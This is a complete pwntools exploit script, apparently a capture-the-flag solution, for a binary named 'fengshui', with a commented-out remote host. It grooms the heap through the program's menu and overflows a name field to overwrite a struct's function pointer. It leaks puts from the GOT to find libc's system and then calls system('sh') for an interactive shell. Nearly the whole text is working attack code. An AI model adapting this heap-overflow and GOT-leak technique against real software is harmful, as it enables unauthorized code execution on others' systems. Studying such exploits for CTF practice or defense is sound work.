from pwn import *

#context.log_level= 'debug'

io = process('./fengshui')
#io = remote('218.2.197.235', 20234)

e = ELF('./fengshui')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./libc-2.19.so')

def add_person(name_len, name, school_len, school, is_tutor='yes'):
	io.recvuntil('option:\n')
	io.sendline('1')

	io.recvuntil('name\n')
	io.sendline(str(name_len))  # malloc name_len +2
	io.recvuntil('name\n')
	io.sendline(name)
	
	io.recvuntil('name\n')
	io.sendline(str(school_len))
	io.recvuntil('name\n')
	io.sendline(school)

	io.recvuntil('(yes/no)\n')
	io.sendline(is_tutor)

	io.recvuntil('id=')
	id = io.recvuntil('\n')
	return int(id)

def edit_person(id, which, name_len, name):
	io.recvuntil('option:\n')
	io.sendline('3')
	io.recvuntil('edit\n')
	io.sendline(str(id))
	io.recvuntil('option:\n')
	io.sendline(str(which))  # code bug! 
	io.recvuntil('name\n')
	io.sendline(str(name_len))
	io.recvuntil('name\n')
	io.sendline(name)

def say_hello(id):
	io.recvuntil('option:\n')
	io.sendline('4')
	io.recvuntil('hello\n')
	io.sendline(str(id))


for i in range(34):
	add_person(0x26,'A'*8 ,0x26, 'B'*8, 'yes')

# 34
id = add_person(0x26,'A'*8 ,0x26, 'B'*8, 'yes')
log.info('new id=%s'%id)
# 35
id = add_person(0x26,'A'*8 ,0x26, 'B'*8, 'yes')
log.info('new id=%s'%id)

_sh = 0x0401678  # string "sh"
_print = 0x40098b

payload = 'A'*40 + p64(0x31)
payload += 'A'*40 + p64(0x31) 
payload += p64(35) + p64(_sh) 
payload += p64(_print) + p64(e.got['puts'])
edit_person(34, 1, 1000, payload)
say_hello(35)  # print puts@got

io.recvuntil('from ')
buf = io.recvuntil('\n').strip().ljust(8,'\x00')
puts_addr = u64(buf)

libc_base =  puts_addr -libc.symbols['puts']
sys_addr = libc_base + libc.symbols['system']

log.success('read:'+ hex(puts_addr))
log.success('system:'+ hex(sys_addr))

payload = 'A'*40 + p64(0x31)
payload += 'A'*40 + p64(0x31) 
payload += p64(35) + p64(_sh) 
payload += p64(sys_addr) + p64(e.got['puts'])
edit_person(34, 1, 1000, payload)

say_hello(35)

#gdb.attach(io, 'x/40gx 0x06023E0')

io.interactive()

